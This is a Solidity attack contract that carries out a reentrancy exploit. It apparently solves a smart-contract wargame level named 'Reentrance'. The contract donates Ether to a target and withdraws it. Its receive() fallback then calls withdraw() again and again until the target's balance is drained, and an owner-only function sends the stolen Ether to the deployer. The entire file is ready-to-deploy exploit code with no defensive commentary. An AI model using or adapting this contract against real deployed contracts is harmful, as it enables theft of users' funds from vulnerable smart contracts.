// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    address owner;
    IReentrance target;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    function attack() public payable {
        // Donate an amount to the target contract
        target.donate{value:msg.value}(address(this));
        // Trigger the reentrancy attack
        target.withdraw(msg.value);
    }

    function withdraw() external {
        require(msg.sender == owner, "you are NOT the owner");
        (bool success, ) = owner.call{value:address(this).balance}("");
        require(success);
        // payable(owner).transfer(address(this).balance);
    }

    // Fallback function that is called whenever the contract receives Ether
    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}